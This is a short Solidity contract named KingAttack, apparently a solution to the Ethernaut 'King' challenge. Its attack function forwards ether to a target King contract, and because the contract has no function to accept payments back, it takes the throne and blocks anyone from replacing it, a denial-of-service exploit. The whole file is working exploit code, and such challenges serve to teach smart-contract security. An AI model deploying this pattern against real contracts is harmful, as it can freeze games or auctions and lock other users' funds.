// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


contract KingAttack {

    address payable kingContractAddress;

    constructor(address payable _kingContractAddress) public {
        kingContractAddress = _kingContractAddress;
    }

    function attack() public payable returns (bool) {
        (bool result,) = kingContractAddress.call{value: msg.value}("");
        return result;
    }
}